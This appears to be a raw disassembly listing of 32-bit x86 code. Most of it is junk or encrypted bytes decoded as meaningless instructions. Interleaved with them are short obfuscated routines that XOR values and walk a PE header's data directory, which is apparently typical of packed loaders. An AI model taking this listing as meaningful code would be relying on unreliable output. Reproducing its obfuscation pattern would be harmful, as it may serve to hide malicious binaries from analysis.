  408d85:	jns    0x408de4
  408d87:	mov    al,0xbc
  408d89:	stos   DWORD PTR es:[edi],eax
  408d8a:	lods   al,BYTE PTR ds:[esi]
  408d8b:	mul    DWORD PTR [esi*1-0x4e7c4752]
  408d92:	aaa    
  408d93:	jb     0x408d5b
  408d95:	add    edi,DWORD PTR [ebx+ecx*1+0x159f9398]
  408d9c:	(bad)  
  408d9d:	leave  
  408d9e:	or     DWORD PTR [esi-0x6710d451],0x3f
  408da5:	xchg   DWORD PTR [edi-0x10],edx
  408da8:	push   es
  408da9:	nop
  408daa:	mov    ebp,0xfa4c46ad
  408daf:	xchg   ebp,eax
  408db0:	mov    ds:0x680b639b,eax
  408db5:	sbb    DWORD PTR [esi],esi
  408db7:	dec    ebp
  408db8:	(bad)  
  408db9:	cli    
  408dba:	pop    ss
  408dbb:	push   esi
  408dbc:	sbb    DWORD PTR [edx+0x35],eax
  408dbf:	sahf   
  408dc0:	out    0x15,al
  408dc2:	xor    ebx,DWORD PTR [edi-0xa634f4]
  408dc8:	dec    ebp
  408dc9:	mov    ds:0x56ea1d74,eax
  408dce:	hlt    
  408dcf:	pop    ebx
  408dd0:	push   ss
  408dd1:	lods   al,BYTE PTR ds:[esi]
  408dd2:	scas   al,BYTE PTR es:[edi]
  408dd3:	xchg   edx,eax
  408dd4:	mov    bh,0xa2
  408dd6:	fs mov esi,0x6133cb07
  408ddc:	stos   BYTE PTR es:[edi],al
  408ddd:	imul   esp,DWORD PTR ds:0x764dda55,0x3dca85ce
  408de7:	or     ebx,esi
  408de9:	jno    0x408dd9
  408deb:	es pop eax
  408ded:	mov    bh,0x37
  408def:	pop    edi
  408df0:	sbb    ecx,edx
  408df2:	and    ch,dh
  408df4:	pop    eax
  408df5:	pop    esp
  408df6:	call   0xbb17b6cf
  408dfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408dfc:	stos   BYTE PTR es:[edi],al
  408dfd:	in     al,0xd3
  408dff:	scas   eax,DWORD PTR es:[edi]
  408e00:	mov    edi,0x7ee7ce20
  408e05:	jno    0x408dda
  408e07:	or     DWORD PTR [ecx+ebp*1],eax
  408e0a:	daa    
  408e0b:	shl    BYTE PTR es:[esi-0x9],1
  408e0f:	lea    edi,[eax+eax*8+0x1b97ba79]
  408e16:	shl    DWORD PTR [ecx],cl
  408e18:	adc    al,0x45
  408e1a:	jge    0x408e78
  408e1c:	mov    al,ds:0x83a5ff4d
  408e21:	imul   ebp,DWORD PTR [ecx],0x66e2fb54
  408e27:	mov    eax,DWORD PTR [ebp-0x4]
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0x7dd74fb4
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	add    esp,0xffffffa4
  408ec7:	adc    BYTE PTR [ebx+0x7e1bfaaf],al
  408ecd:	(bad)  
  408ece:	(bad)  
  408ecf:	mov    ebx,0x8699bfff
  408ed4:	mul    BYTE PTR es:[ecx+0xa]
  408ed8:	push   eax
  408ed9:	xchg   ebx,eax
  408eda:	mov    al,0x40
  408edc:	adc    esp,DWORD PTR [ebx+0x4d]
  408edf:	cmp    al,0xde
  408ee1:	add    esi,DWORD PTR [esi+ebx*1+0x1c]
  408ee5:	out    dx,eax
  408ee6:	jle    0x408e8a
  408ee8:	xchg   ebx,eax
  408ee9:	dec    edi
  408eea:	lods   eax,DWORD PTR ds:[esi]
  408eeb:	xor    DWORD PTR [esi-0x38],ecx
  408eee:	pop    edx
  408eef:	les    esi,FWORD PTR [edx-0x7a]
  408ef2:	mov    WORD PTR [edx-0x13],es
  408ef5:	pop    ecx
  408ef6:	call   0x1f0a:0x828e451c
  408efd:	stc    
  408efe:	mov    al,ds:0xd8cfa760
  408f03:	rcl    BYTE PTR [eax+0x470af12d],1
  408f09:	mov    ebp,0x4fad1be5
  408f0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f0f:	ds or  bl,ah
  408f12:	adc    eax,0xfb606002
  408f17:	stos   BYTE PTR es:[edi],al
  408f18:	mov    cl,0x34
  408f1a:	scas   al,BYTE PTR es:[edi]
  408f1b:	sub    ch,BYTE PTR [esi-0x2bfdc18a]
  408f21:	mov    eax,ds:0x539823fc
  408f26:	test   eax,0x6dd32b43
  408f2b:	bswap  ebx
  408f2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f2e:	mov    ch,0x73
  408f30:	pop    eax
  408f31:	rcl    BYTE PTR [ebx+ebx*1],0x5d
  408f35:	pop    ebx
  408f36:	inc    ebx
  408f37:	xchg   esp,eax
  408f38:	sbb    al,0xff
  408f3a:	fist   WORD PTR [ebp-0x52]
  408f3d:	fimul  WORD PTR ds:0x6d0546aa
  408f43:	jo     0x408ed1
  408f45:	ret    0x3de
  408f48:	mov    esi,0x3b341230
  408f4d:	and    esp,DWORD PTR [eax+0x7b777236]
  408f53:	cdq    
  408f54:	ins    DWORD PTR es:[edi],dx
  408f55:	pop    esp
  408f56:	repnz mov eax,0x4c211c73
  408f5c:	out    0xb0,al
  408f5e:	rcr    BYTE PTR cs:0x77789fd5,0x72
  408f66:	lea    edx,[ebx]
  408f68:	imul   edx,DWORD PTR [ecx-0xa65a6ca],0xcf5c4d86
  408f72:	test   BYTE PTR cs:[ebx-0x20],cl
  408f76:	adc    ebx,esi
  408f78:	adc    DWORD PTR [edx-0x234db981],ecx
  408f7e:	cs test eax,0x67f934ef
  408f84:	mov    esp,0x3886af6c
  408f89:	aas    
  408f8a:	xor    dl,ch
  408f8c:	fsubr  QWORD PTR [edi-0x67]
  408f8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f90:	pusha  
  408f91:	lahf   
  408f92:	dec    eax
  408f93:	pop    ds
  408f94:	jae    0x408fe8
  408f96:	push   eax
  408f97:	cmc    
  408f98:	fisttp DWORD PTR [ecx+0x783f8b84]
  408f9e:	in     eax,0x5e
  408fa0:	mov    cl,0x4c
  408fa2:	(bad)  
  408fa3:	lods   eax,DWORD PTR ds:[esi]
  408fa4:	std    
  408fa5:	mov    ch,0xe6
  408fa7:	addr16 xchg edx,eax
  408fa9:	push   ds
  408faa:	xchg   esi,eax
  408fab:	aaa    
  408fac:	and    DWORD PTR [eax+ebx*4+0x7fbbd6be],edi
  408fb3:	xor    DWORD PTR [edx+0x3c],ebp
  408fb6:	in     eax,0x4b
  408fb8:	fs mov dh,0x11
  408fbb:	rcl    BYTE PTR [esi+0x19b085c3],1
  408fc1:	mov    esp,0xf76aab3f
  408fc6:	jne    0x408fff
  408fc8:	xchg   esp,eax
  408fc9:	dec    edx
  408fca:	or     DWORD PTR [ebx+0x63],ebp
  408fcd:	shl    BYTE PTR [eax],cl
  408fcf:	xchg   ch,dl
  408fd1:	adc    eax,0x5ddb3813
  408fd6:	xor    BYTE PTR [ebp+0x7b],0xdc
  408fda:	and    dl,BYTE PTR [edi-0x33]
  408fdd:	gs jno 0x408fcf
  408fe0:	mov    DWORD PTR ds:0xba07d00d,eax
  408fe6:	jge    0x408ffb
  408fe8:	dec    edx
  408fe9:	mov    ebx,DWORD PTR [ebp-0x45]
  408fec:	das    
  408fed:	ss lahf 
  408fef:	and    DWORD PTR [ecx],ecx
  408ff1:	xchg   ebp,eax
  408ff2:	std    
  408ff3:	push   0xdd06a3d7
  408ff8:	pusha  
  408ff9:	xor    bh,BYTE PTR [ebx-0x4a]
  408ffc:	out    0xb,eax
  408ffe:	xor    eax,0xde576d5d
  409003:	add    BYTE PTR [esi],ah
  409005:	repz icebp 
  409007:	jae    0x409066
  409009:	mov    ?,WORD PTR [ecx]
  40900b:	push   edx
  40900c:	popf   
  40900d:	popf   
  40900e:	jae    0x409018
  409010:	lods   eax,DWORD PTR ds:[esi]
  409011:	outs   dx,BYTE PTR ds:[esi]
  409012:	dec    ebx
  409013:	dec    ebp
  409014:	(bad)  
  409015:	pusha  
  409016:	ins    DWORD PTR es:[edi],dx
  409017:	cmp    bh,BYTE PTR [ebx+0x40]
  40901a:	mov    bl,dl
  40901c:	pop    ebp
  40901d:	imul   ebx,ecx,0xfe6852d6
  409023:	ret    
  409024:	mov    edx,0x8e2655ca
  409029:	xchg   ebx,eax
  40902a:	mov    ebp,0xb8599a81
  40902f:	jae    0x40900e
  409031:	(bad)  
  409032:	out    dx,eax
  409033:	sbb    eax,0x9ea890a3
  409038:	mov    ds:0xf0a414ca,al
  40903d:	cmp    DWORD PTR [ebx+0x4d],edi
  409040:	imul   eax,DWORD PTR [ebp+0x8b8e6ed],0x25
  409047:	pusha  
  409048:	imul   ecx,DWORD PTR [ecx-0x68],0xb64a781f
  40904f:	imul   edi,DWORD PTR [ebp-0x1e],0x69
  409053:	jb     0x4090aa
  409055:	xor    eax,0x144ad75d
  40905a:	lods   al,BYTE PTR ds:[esi]
  40905b:	pop    ds
  40905c:	fimul  WORD PTR [ecx-0x42]
  40905f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409060:	ins    DWORD PTR es:[edi],dx
  409061:	les    eax,FWORD PTR [esi]
  409063:	bound  ebp,QWORD PTR [esi+edi*4]
  409066:	or     DWORD PTR [eax],esi
  409068:	inc    esi
  409069:	sub    BYTE PTR [esi+eax*2-0x1fdb77b3],0xe4
  409071:	loop   0x409006
  409073:	imul   bh
  409075:	cdq    
  409076:	cs pop ss
  409078:	inc    esi
  409079:	pop    edx
  40907a:	fdivr  QWORD PTR [edi-0x4a]
  40907d:	ja     0x40903c
  40907f:	std    
  409080:	fsubr  DWORD PTR [edi-0x25]
  409083:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409084:	fnstsw WORD PTR [edx]
  409086:	(bad)  
  409087:	clc    
  409088:	xchg   edi,eax
  409089:	or     ch,BYTE PTR [eax+0x59]
  40908c:	xor    BYTE PTR [ebx],bl
  40908e:	xchg   edi,eax
  40908f:	cmp    ah,BYTE PTR [esi]
  409091:	test   ebx,0x9fc1fde5
  409097:	lock jbe 0x4090fd
  40909a:	cmp    edx,0xffffffa7
  40909d:	or     DWORD PTR [eax+0x7c],ebx
  4090a0:	push   ss
  4090a1:	mov    edi,0x2c0362b2
  4090a6:	(bad)  
  4090a8:	inc    esi
  4090a9:	shl    DWORD PTR [ebx-0x10],1
  4090ac:	dec    esp
  4090ad:	xchg   esi,eax
  4090ae:	pop    es
  4090af:	jg     0x409101
  4090b1:	stc    
  4090b2:	jle    0x409045
  4090b4:	adc    DWORD PTR [esi+0x6660ee26],eax
  4090ba:	enter  0x6d7e,0xff
  4090be:	sbb    BYTE PTR [ebx-0x37],bl
  4090c1:	ret    0x4bf1
  4090c4:	dec    esp
  4090c5:	dec    edi
  4090c6:	test   BYTE PTR [esi],bh
  4090c8:	cmp    esp,DWORD PTR ds:0x61d20068
  4090ce:	jo     0x4090f7
  4090d0:	fs push es
  4090d2:	adc    dl,BYTE PTR [esi+0x38]
  4090d5:	xor    esp,esi
  4090d7:	push   edi
  4090d8:	test   eax,0xd416a791
  4090dd:	or     ebx,DWORD PTR [eax-0x4d]
  4090e0:	add    BYTE PTR [edx-0x36],0x51
  4090e4:	outs   dx,DWORD PTR ds:[esi]
  4090e5:	outs   dx,DWORD PTR ds:[esi]
  4090e6:	inc    ebx
  4090e7:	les    ecx,FWORD PTR [edi-0x2e305d33]
  4090ed:	xor    dh,BYTE PTR [ebx]
  4090ef:	mov    BYTE PTR [ebx],0xc7
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0x5d
  409163:	mov    al,ds:0xdf32bc22
  409168:	jle    0x4091e8
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	hlt    
  40916f:	imul   ecx,DWORD PTR [eax-0x7f],0xffffffe8
  409173:	jb     0x40914a
  409175:	pop    ss
  409176:	mov    dh,0x32
  409178:	mov    ebp,0x662979bc
  40917d:	popa   
  40917e:	and    ecx,DWORD PTR ds:0xe79b24ed
  409184:	inc    esi
  409185:	dec    esp
  409186:	retf   0xbaaf
  409189:	ss push ebx
  40918b:	and    esp,eax
  40918d:	(bad)  
  40918e:	out    dx,al
  40918f:	sbb    al,0x63
  409191:	mov    eax,ds:0x9dcf3a00
  409196:	shl    BYTE PTR [edi-0x7c],1
  409199:	stos   BYTE PTR es:[edi],al
  40919a:	push   0xc68b885b
  40919f:	adc    BYTE PTR [eax+ecx*4+0x8333884],bh
  4091a6:	(bad)  [ebx]
  4091a8:	rcr    BYTE PTR [esp+esi*2-0x359e224f],0x2a
  4091b0:	cmp    edi,DWORD PTR [eax-0x6d]
  4091b3:	leave  
  4091b4:	rcr    BYTE PTR [ecx-0x11],1
  4091b7:	outs   dx,BYTE PTR ds:[esi]
  4091b8:	into   
  4091b9:	pop    esi
  4091ba:	stc    
  4091bb:	sbb    edi,DWORD PTR [ecx+0x4c]
  4091be:	mov    eax,ds:0xed785625
  4091c3:	call   0x3f87:0x6f5e2b7
  4091ca:	push   ss
  4091cb:	xor    ebx,DWORD PTR [ebx]
  4091cd:	mov    al,0x3
  4091cf:	(bad)  
  4091d0:	scas   al,BYTE PTR es:[edi]
  4091d1:	sbb    DWORD PTR ss:[ecx],edi
  4091d4:	retf   0xc2cf
  4091d7:	or     al,0x9a
  4091d9:	cmc    
  4091da:	ins    DWORD PTR es:[edi],dx
  4091db:	add    eax,0x48a1d4ff
  4091e0:	or     esi,eax
  4091e2:	inc    esi
  4091e3:	add    BYTE PTR [edx+0x5d657016],bl
  4091e9:	clc    
  4091ea:	call   0x4329584d
  4091ef:	push   edi
  4091f0:	inc    ebx
  4091f1:	xchg   esi,eax
  4091f2:	aad    0xad
  4091f4:	pop    ecx
  4091f5:	inc    ecx
  4091f6:	ret    
  4091f7:	dec    ebp
  4091f8:	das    
  4091f9:	fdiv   st,st(1)
  4091fb:	dec    ebp
  4091fc:	xor    eax,0x59de1675
  409201:	push   esp
  409202:	adc    DWORD PTR [ebp-0x38],eax
  409205:	mov    ah,0xdf
  409207:	or     bl,BYTE PTR ds:0x79c97274
  40920d:	popf   
  40920e:	inc    ebp
  40920f:	sub    al,0x57
  409211:	(bad)  
  409212:	mov    cl,0x5f
  409214:	jb     0x4091ba
  409216:	out    dx,al
  409217:	enter  0xd4ec,0x58
  40921b:	add    DWORD PTR [ebx],ecx
  40921d:	inc    edi
  40921e:	push   ss
  40921f:	(bad)  
  409220:	sti    
  409221:	test   BYTE PTR [ebp-0x6e],ch
  409224:	sbb    ah,BYTE PTR [edx-0x32]
  409227:	in     al,dx
  409228:	inc    edx
  409229:	les    esp,FWORD PTR [ebx]
  40922b:	pop    esp
  40922c:	retf   
  40922d:	imul   edi,DWORD PTR [ecx*8+0x49ee346d],0x52
  409235:	stos   BYTE PTR es:[edi],al
  409236:	std    
  409237:	inc    esp
  409238:	mov    ebp,0x49a55dad
  40923d:	add    edi,esi
  40923f:	cmp    DWORD PTR [ebp-0x44],ecx
  409242:	mov    ah,0x5b
  409244:	pop    eax
  409245:	std    
  409246:	or     al,0x8c
  409248:	mov    bl,0x34
  40924a:	pop    ds
  40924b:	mov    BYTE PTR [esi-0x18c01f9f],al
  409251:	mov    eax,ds:0x935d7162
  409256:	dec    ebx
  409257:	push   es
  409258:	mov    eax,DWORD PTR [ecx+0x55718472]
  40925e:	mov    ebp,0xf7b2d6d5
  409263:	mov    edi,DWORD PTR [eax+0x28]
  409266:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409267:	sbb    ebx,edx
  409269:	push   edi
  40926a:	sbb    dl,dh
  40926c:	add    bh,ah
  40926e:	enter  0x39bb,0xfd
  409272:	sahf   
  409273:	or     dl,BYTE PTR [ecx-0x24]
  409276:	xchg   esp,eax
  409277:	enter  0x90e2,0xa
  40927b:	sahf   
  40927c:	call   0x148:0x446fb027
  409283:	mov    ah,0xbd
  409285:	aam    0x5f
  409287:	or     al,0x35
  409289:	jle    0x409290
  40928b:	jmp    0x409226
  40928d:	lahf   
  40928e:	fadd   DWORD PTR [edi-0x2b]
  409291:	clc    
  409292:	aam    0xd5
  409294:	popa   
  409295:	or     eax,0xd9578e6
  40929a:	or     al,0x4b
  40929c:	into   
  40929d:	cdq    
  40929e:	add    ebx,esi
  4092a0:	and    edi,DWORD PTR [edi]
  4092a2:	push   eax
  4092a3:	in     al,dx
  4092a4:	repnz and esi,ebx
  4092a7:	pop    esi
  4092a8:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4092aa:	jbe    0x4092d2
  4092ac:	fwait
  4092ad:	jg     0x4092c4
  4092af:	mov    esp,0x3c12ed30
  4092b4:	loop   0x409312
  4092b6:	mov    ebx,0xb16da4df
  4092bb:	sub    eax,0xab2ed4ca
  4092c0:	int    0xd4
  4092c2:	leave  
  4092c3:	cmp    ebp,DWORD PTR [esp+ebp*8]
  4092c6:	scas   eax,DWORD PTR es:[edi]
  4092c7:	push   ecx
  4092c8:	inc    ecx
  4092c9:	daa    
  4092ca:	push   es
  4092cb:	mov    ch,0xca
  4092cd:	leave  
  4092ce:	cmp    esp,ebx
  4092d0:	cmp    esp,ebx
  4092d2:	lds    eax,FWORD PTR [eax-0x73b51231]
  4092d8:	adc    esp,DWORD PTR [edi]
  4092da:	repz push edx
  4092dc:	cmp    eax,0x64df386d
  4092e1:	enter  0x5b6b,0xfe
  4092e5:	fist   DWORD PTR [ebp-0x683c24b9]
  4092eb:	inc    edi
  4092ec:	xchg   ebp,eax
  4092ed:	pop    ds
  4092ee:	inc    ebp
  4092ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092f0:	cld    
  4092f1:	sub    eax,0x654cb036
  4092f6:	in     al,dx
  4092f7:	push   esi
  4092f8:	sub    al,BYTE PTR [ecx+0x12]
  4092fb:	lea    ebp,[edi+0x63]
  4092fe:	push   es
  4092ff:	add    ebp,ebx
  409301:	test   eax,0x8a720b2a
  409306:	stos   BYTE PTR es:[edi],al
  409307:	dec    edx
  409308:	fisttp QWORD PTR ds:0x9b37c337
  40930e:	mov    ecx,0x8caeb203
  409313:	or     BYTE PTR [ebp-0x79f3ac32],dh
  409319:	xchg   esi,eax
  40931a:	inc    ebp
  40931b:	jnp    0x409352
  40931d:	sbb    dh,BYTE PTR [eax-0x61]
  409320:	addr16 xchg edi,eax
  409322:	jg     0x409387
  409324:	leave  
  409325:	sub    bl,BYTE PTR [ecx-0x7cf65203]
  40932b:	mov    al,0x96
  40932d:	jg     0x4092de
  40932f:	and    eax,0x82cd7970
  409334:	out    0xf,al
  409336:	or     DWORD PTR [edi-0x932af64],edx
  40933c:	in     al,dx
  40933d:	nop
  40933e:	and    edi,DWORD PTR [ebx-0xc976ff5]
  409344:	push   es
  409345:	push   cx
  409347:	xchg   ebx,eax
  409348:	js     0x4092db
  40934a:	mov    dh,0x9f
  40934c:	aad    0x21
  40934e:	icebp  
  40934f:	dec    edx
  409350:	aaa    
  409351:	arpl   WORD PTR [esi+0x12ada29d],di
  409357:	pop    ebx
  409358:	jg     0x40939d
  40935a:	pop    edx
  40935b:	cs push 0xffffffd1
  40935e:	push   0xd17bc3ef
  409363:	es pop edx
  409365:	jmp    0x40932f
  409367:	jo     0x40934f
  409369:	je     0x4093e2
  40936b:	and    ebp,DWORD PTR [esi]
  40936d:	adc    al,0x81
  40936f:	adc    BYTE PTR [ecx+0x7e],dl
  409372:	xchg   ebx,eax
  409373:	ror    dl,0xb
  409376:	inc    ecx
  409377:	in     al,dx
  409378:	mov    ebx,fs
  40937a:	adc    ah,al
  40937c:	rcr    DWORD PTR [ebx-0x7dab7fe6],1
  409382:	retf   
  409383:	clc    
  409384:	inc    ebx
  409385:	pop    esi
  409386:	(bad)  
  409388:	stos   BYTE PTR es:[edi],al
  409389:	cwde   
  40938a:	sbb    eax,0xdfaa9bef
  40938f:	push   0x45d4f4eb
  409394:	inc    ecx
  409395:	pop    ds
  409396:	test   eax,0x8b0889ab
  40939b:	inc    ebp
  40939c:	or     al,0x8b
  40939e:	inc    ebp
  40939f:	or     bh,bh
  4093a1:	jne    0x40939b
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	sub    eax,0xd83a1449
  4093b9:	fnstsw WORD PTR [esi+0x7e]
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	inc    edi
  4093c1:	xchg   ecx,eax
  4093c2:	das    
  4093c3:	xlat   BYTE PTR ds:[ebx]
  4093c4:	mov    bh,dh
  4093c6:	shr    BYTE PTR [ebp*4-0x25c79b06],1
  4093cd:	neg    BYTE PTR [esi]
  4093cf:	xchg   ebp,eax
  4093d0:	pop    edx
  4093d1:	in     al,0x8b
  4093d3:	push   edx
  4093d4:	adc    eax,0x2a417312
  4093d9:	push   0x9
  4093db:	pushf  
  4093dc:	retf   
  4093dd:	lock out dx,al
  4093df:	mov    ah,0xbe
  4093e1:	mov    ?,WORD PTR [edx+0x1d]
  4093e4:	dec    ebx
  4093e5:	ret    0x23d1
  4093e8:	inc    edx
  4093e9:	mov    edi,0x4823921
  4093ee:	out    dx,al
  4093ef:	lea    eax,[ebp-0x56]
  4093f2:	mov    eax,fs
  4093f4:	inc    ebp
  4093f5:	inc    ecx
  4093f6:	push   eax
  4093f7:	loopne 0x40945c
  4093f9:	or     eax,0x168b161d
  4093fe:	div    DWORD PTR [ebx+ebx*2]
  409401:	add    eax,0xf1e055b3
  409406:	fbld   TBYTE PTR [ebp+ebx*1-0x7a]
  40940a:	in     eax,dx
  40940b:	adc    al,0x1a
  40940d:	bswap  esi
  40940f:	lds    edi,FWORD PTR [esi+0x39]
  409412:	pop    edi
  409413:	mov    dh,0xfe
  409415:	imul   ebx,DWORD PTR [eax+0x38],0x53
  409419:	push   esi
  40941a:	cmp    BYTE PTR [edi-0x19631b7c],bl
  409420:	jge    0x40942f
  409422:	jne    0x4093be
  409424:	dec    ecx
  409425:	adc    al,0x47
  409427:	sti    
  409428:	loope  0x409444
  40942a:	sbb    DWORD PTR [eax+0x2ebdcb3a],ebp
  409430:	fadd   QWORD PTR [eax+ebp*4]
  409433:	fnstenv [esi]
  409435:	xor    BYTE PTR ds:0x8b9f4711,dh
  40943b:	adc    BYTE PTR [ecx+0x253f131],al
  409441:	daa    
  409442:	fist   DWORD PTR [ebx+0x20]
  409445:	cmp    dl,ch
  409447:	or     DWORD PTR [esi+edi*8+0x86fd26d],edx
  40944e:	jmp    0x409460
  409450:	outs   dx,BYTE PTR ds:[esi]
  409451:	pop    ecx
  409452:	bound  ecx,QWORD PTR [eax]
  409454:	mov    eax,0x1c5115bf
  409459:	stos   DWORD PTR es:[edi],eax
  40945a:	div    BYTE PTR [eax]
  40945c:	clc    
  40945d:	mov    eax,ebx
  40945f:	mov    ah,BYTE PTR [ebx+0x3fd2e11a]
  409465:	stos   DWORD PTR es:[edi],eax
  409466:	mov    ebp,0x1eba018c
  40946b:	jmp    0x409430
  40946d:	dec    eax
  40946e:	jp     0x4094aa
  409470:	or     ah,BYTE PTR [edi+0x5]
  409473:	mov    ebx,DWORD PTR [ebx+0x79dc67b3]
  409479:	ss dec esp
  40947b:	or     al,dl
  40947d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40947e:	jecxz  0x40948e
  409480:	xor    ecx,esp
  409482:	or     al,bl
  409484:	xchg   DWORD PTR [esi],ebp
  409486:	sbb    DWORD PTR [ebx],esi
  409488:	sub    BYTE PTR ds:0xb63a8b1,0xfa
  40948f:	xchg   dl,cl
  409491:	jb     0x40948f
  409493:	bound  edx,QWORD PTR [esi+esi*1-0x125d8f20]
  40949a:	stos   DWORD PTR es:[edi],eax
  40949b:	fwait
  40949c:	pop    ss
  40949d:	ret    
  40949e:	bound  dx,DWORD PTR [ebx]
  4094a1:	pop    ds
  4094a2:	outs   dx,DWORD PTR ds:[esi]
  4094a3:	(bad)  [ebx+0x12]
  4094a6:	std    
  4094a7:	fadd   DWORD PTR [edi-0x4a]
  4094aa:	bound  esp,QWORD PTR [edx]
  4094ac:	and    al,BYTE PTR [esi]
  4094ae:	imul   ebx,DWORD PTR [edi+0x4042c974],0x7b8e58bd
  4094b8:	and    ch,bh
  4094ba:	loop   0x409494
  4094bc:	mov    dl,0x98
  4094be:	push   ds
  4094bf:	sahf   
  4094c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094c1:	ret    0x9b39
  4094c4:	xlat   BYTE PTR ds:[ebx]
  4094c5:	dec    eax
  4094c6:	push   ds
  4094c7:	les    esi,FWORD PTR [ebx+0x1c6ed58b]
  4094cd:	cmc    
  4094ce:	and    eax,0x1d71f7ea
  4094d3:	push   eax
  4094d4:	rol    BYTE PTR [ebp+ebp*2-0x48],1
  4094d8:	ja     0x4094c8
  4094da:	icebp  
  4094db:	sub    eax,0x6df1478b
  4094e0:	sbb    DWORD PTR [ecx+0x5ff36355],0x58
  4094e7:	out    dx,al
  4094e8:	leave  
  4094e9:	out    0xc6,al
  4094eb:	leave  
  4094ec:	jo     0x4094bb
  4094ee:	int3   
  4094ef:	mov    ebp,DWORD PTR [edi-0x79]
  4094f2:	lea    ebp,[edi-0x56]
  4094f5:	dec    esp
  4094f6:	sbb    DWORD PTR [ecx],0x93f8862f
  4094fc:	adc    esp,DWORD PTR [ebp-0x38]
  4094ff:	add    DWORD PTR [edx+0x2f],ebp
  409502:	xchg   edx,eax
  409503:	ret    
  409504:	imul   ebp,DWORD PTR [edx-0x44],0xffffffdd
  409508:	xchg   DWORD PTR [eax],edi
  40950a:	test   al,0x26
  40950c:	fcom   QWORD PTR [ecx]
  40950e:	adc    al,0xa6
  409510:	call   0xda9a:0xc6215aa8
  409517:	cmp    al,0x45
  409519:	sub    al,BYTE PTR [ebx-0x25]
  40951c:	repz cwde 
  40951e:	shl    BYTE PTR [eax+0xf],0x96
  409522:	cmp    BYTE PTR [ecx+0x21],bl
  409525:	push   ds
  409526:	sbb    al,ah
  409528:	repnz push esi
  40952a:	popf   
  40952b:	pusha  
  40952c:	test   al,0xdb
  40952e:	push   0x212ded86
  409533:	clc    
  409534:	shl    ah,0x14
  409537:	mov    bh,0x52
  409539:	mov    dh,dl
